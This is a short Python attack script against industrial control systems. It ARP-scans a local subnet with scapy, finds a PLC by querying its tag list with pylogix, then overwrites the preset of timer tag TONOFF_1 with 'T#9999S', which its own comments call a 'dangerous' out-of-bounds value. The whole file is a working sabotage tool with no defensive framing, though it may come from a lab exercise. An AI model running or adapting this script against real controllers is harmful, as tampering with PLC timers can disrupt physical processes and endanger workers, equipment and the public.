from pylogix import PLC
import scapy.all as scapy

# Function to find the PLC IP address on the network
def find_plc_ip():
    print("[*] Scanning network to find PLC IP...")
    
    arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Adjust subnet as needed
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    potential_ips = [entry[1].psrc for entry in answered_list]
    for ip in potential_ips:
        print(f"[*] Checking IP: {ip}")
        try:
            with PLC(ip) as comm:
                if comm.GetTagList():  # Valid PLC will respond to this request
                    print(f"[+] Found PLC at {ip}")
                    return ip
        except:
            pass
    
    print("[-] No PLC found on the network")
    return None

# Function to modify the timer setting on the PLC
def modify_plc_parameter(plc_ip):
    if not plc_ip:
        print("[-] Unable to find PLC on the network. Exiting.")
        return
    
    print(f"[*] Connecting to PLC at {plc_ip}...")
    
    comm = PLC()
    comm.IPAddress = plc_ip
    
    # Read current PT value for TONOFF_1
    current_value = comm.Read("TONOFF_1.PT").Value
    print(f"[+] Current TONOFF_1.PT: {current_value}")

    # Modify PT to an out-of-bounds dangerous value (e.g., extremely high time delay)
    new_value = "T#9999S"  # Change timer to an exaggerated duration
    print(f"[!] Modifying TONOFF_1.PT to {new_value}...")

    comm.Write("TONOFF_1.PT", new_value)

    # Confirm modification
    modified_value = comm.Read("TONOFF_1.PT").Value
    print(f"[+] New TONOFF_1.PT: {modified_value}")
    
    comm.Close()

# Main execution flow
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    modify_plc_parameter(plc_ip)